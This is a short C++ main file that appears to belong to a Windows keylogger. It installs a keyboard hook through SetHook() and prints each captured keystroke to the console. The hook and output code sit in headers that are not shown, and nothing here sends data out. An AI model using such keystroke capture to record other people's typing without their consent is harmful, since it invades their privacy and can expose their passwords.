#include "headers\\input_module.h"
#include "headers\\tree.h"
#include "headers\\output_module.h"
#include "headers\\self.h"

int Track(int key_stroke)
{
    std::cout << key_stroke << '\t' << char(key_stroke) << std::endl;
    return 0;
}

int main()
{
    // set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}